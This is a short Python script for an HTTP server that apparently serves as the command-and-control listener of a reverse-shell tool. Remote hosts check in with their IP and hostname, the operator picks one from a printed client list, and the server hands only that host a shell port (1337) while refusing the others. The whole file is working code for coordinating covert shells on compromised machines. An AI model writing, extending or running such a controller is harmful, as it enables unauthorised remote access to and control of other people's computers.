#!/usr/bin/python3
#-*- coding: utf-8 -*-
# 
enc = "utf-8"
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import threading
import output
# SETTINGS
# -------------------
http_port = 8088
shell_port = "1337"
# -------------------

param_list = []
acc_ip = ''

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        try:
            param_list.remove(params)
        except:
            pass
        param_list.append(params)
        if params["ip"][0] == acc_ip:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            message = shell_port
            self.wfile.write(bytes(message, enc))
            return
        self.send_response(403)
        self.send_header('Content-type','text/html')
        self.end_headers()
        message = ""
        self.wfile.write(bytes(message, enc))
        return

def main():
    global out
    out = output.Output()
    out.promptInfo('serving...')
    server_address=('0.0.0.0', http_port)
    httpd = HTTPServer(server_address, RequestHandler)
    #t = threading.Thread(name='server', target=httpd.serve_forever())
    #t.start()
    while True:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            out.cPrint("\nClient List:\n--------------------", 'w')
            for i in param_list:
                out.cPrint(i["ip"][0] + ":" + i["hostname"][0], 'b')#Add more params here
            #print(param_list)
            out.cPrint("Connect to: (blank for nothing)", 'w')
            global acc_ip
            acc_ip = str(input(">>> "))

if __name__ == "__main__":
    main()

